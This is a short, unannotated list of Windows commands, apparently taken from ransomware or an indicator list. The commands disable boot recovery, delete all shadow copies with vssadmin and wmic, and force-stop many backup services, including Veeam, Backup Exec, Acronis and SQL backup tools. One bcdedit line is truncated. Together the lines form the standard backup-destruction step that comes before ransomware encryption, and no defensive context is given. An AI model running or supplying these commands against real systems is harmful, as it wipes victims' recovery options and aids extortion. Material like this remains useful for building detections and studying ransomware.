sc  config "Netbackup Legacy Network service" start= disabled
bcdedit  /set {default}
bcdedit  /set {default} recoveryenabled No 
vssadmin.exe  Delete Shadows /all /quiet
wmic.exe  Shadowcopy Delete
net  stop "Zoolz 2 Service" /y
net  stop "Veeam Backup Catalog Data Service" /y
net  stop "Symantec System Recovery" /y
net  stop "SQLsafe Filter Service" /y
net  stop "SQLsafe Backup Service" /y
net  stop "SQL Backups" /y
net  stop "Acronis VSS Provider" /y
net  stop VeeamDeploySvc /y
net  stop BackupExecVSSProvider /y
net  stop BackupExecRPCService /y
net  stop BackupExecManagementService /y
net  stop BackupExecJobEngine /y
net  stop BackupExecDeviceMediaService /y